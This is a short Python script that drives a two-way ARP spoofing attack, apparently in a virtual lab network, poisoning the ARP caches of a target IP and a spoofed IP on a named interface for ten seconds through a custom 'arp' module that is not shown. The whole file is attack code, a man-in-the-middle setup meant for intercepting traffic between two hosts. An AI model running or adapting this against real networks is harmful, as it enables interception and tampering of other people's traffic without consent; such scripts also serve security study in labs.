from arp import *
import dns

TARGET_IP = "192.168.56.101"
SPOOFED_IP = "192.168.56.102"
IFACE = "enp0s3"

arp1 = arp()

arp1.two_way_arp_spoof(TARGET_IP, SPOOFED_IP, 2, IFACE)

try:
    time.sleep(10)
except KeyboardInterrupt:
    pass
arp1.stop_two_way_spoof()
